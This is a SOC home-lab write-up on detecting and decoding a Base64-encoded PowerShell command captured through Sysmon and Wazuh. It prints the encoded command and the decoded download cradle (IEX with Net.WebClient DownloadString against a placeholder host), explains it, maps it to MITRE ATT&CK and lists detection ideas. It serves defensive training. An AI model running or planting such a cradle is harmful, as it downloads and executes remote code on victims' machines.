\# PowerShell Encoded Command Analysis  

\## SOC Home Lab – Detection \& Investigation



---



\## 🎯 Scenario



A suspicious PowerShell process was observed executing with the `-EncodedCommand` parameter.



Encoded PowerShell commands are frequently used by attackers to:



\- Obfuscate malicious payloads  

\- Bypass basic logging visibility  

\- Execute fileless malware  

\- Download and stage remote payloads  



This lab simulates real-world adversary behavior and demonstrates proper SOC investigation workflow.



---



\## 🖥️ Detection Source



\*\*Log Source:\*\* Sysmon – Event ID 1 (Process Create)  

\*\*SIEM:\*\* Wazuh  

\*\*Endpoint:\*\* Windows  



Captured command:



```powershell

powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQA=



Parent Process

C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe



User

DESKTOP-ON8B91Q\\socuser



\## 🔎 Investigation Workflow

\### Step 1 – Identify Encoded Execution



The presence of -EncodedCommand indicates Base64-encoded content.



PowerShell encodes commands using:



Base64(UTF-16LE text)



\### Step 2 – Decode Using CyberChef



CyberChef Recipe:



From Base64



Decode Text → UTF-16LE (1200)



Decoded Output:



IEX (New-Object Net.WebClient).DownloadString('http://example.com')



\## 🧠 Behavioral Analysis

The decoded command performs the following actions:



* Creates a WebClient object:



New-Object Net.WebClient



* Downloads remote content:



DownloadString('http://example.com')



* Executes downloaded content directly in memory:



IEX (Invoke-Expression)



\## 🚨 Attacker Intent

This technique is known as a PowerShell download cradle.



\### Behavioral Characteristics



Remote payload retrieval



In-memory execution



Fileless attack technique



Living-off-the-Land binary abuse



\### SOC Assessment



The attacker attempted to download a remote script and execute it directly in memory via Invoke-Expression, consistent with payload staging or command-and-control loader behavior.



Although the simulated domain returned HTML (causing execution errors), the technique mirrors real-world adversary tradecraft.



\## 🗺 MITRE ATT\&CK Mapping

Technique	                                         ID

Command \& Scripting Interpreter: PowerShell	         T1059.001

Ingress Tool Transfer	                                 T1105

Obfuscated/Encoded Files	                         T1027

Deobfuscate/Decode Files	                         T1140



\## 🔐 Detection Opportunities

This activity can be detected by:

* Monitoring -EncodedCommand usage
* Detecting Base64 patterns in command-line arguments
* Correlating PowerShell execution with network activity
* Behavioral detection of IEX usage
* Alerting on suspicious parent-child process relationships



\## 📈 Skills Demonstrated

* PowerShell attack analysis
* Base64 decoding \& UTF-16LE understanding
* Threat hunting with Sysmon telemetry
* SOC triage methodology
* Behavioral classification
* MITRE ATT\&CK mapping



\## ✅ Conclusion

This lab demonstrates practical SOC analysis of encoded PowerShell execution and reinforces the importance of:

* Decoding obfuscated commands
* Understanding attacker tradecraft
* Correlating endpoint telemetry
* Classifying intent accurately

This workflow reflects real-world SOC and incident response investigation methodology.

